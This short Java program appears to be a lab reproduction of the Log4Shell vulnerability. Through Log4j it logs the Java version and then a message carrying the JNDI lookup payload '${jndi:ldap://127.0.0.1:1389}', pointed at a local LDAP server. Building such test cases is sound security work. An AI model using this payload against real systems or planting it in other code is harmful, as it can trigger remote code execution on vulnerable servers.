import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {

    private static final Logger logger = LogManager.getLogger("log4shell");

    public static void main(String[] args) {
        logger.info("Java version: {}", System.getProperty("java.runtime.version"));
        logger.info("Received a request for API version ${jndi:ldap://127.0.0.1:1389}");
    }
}
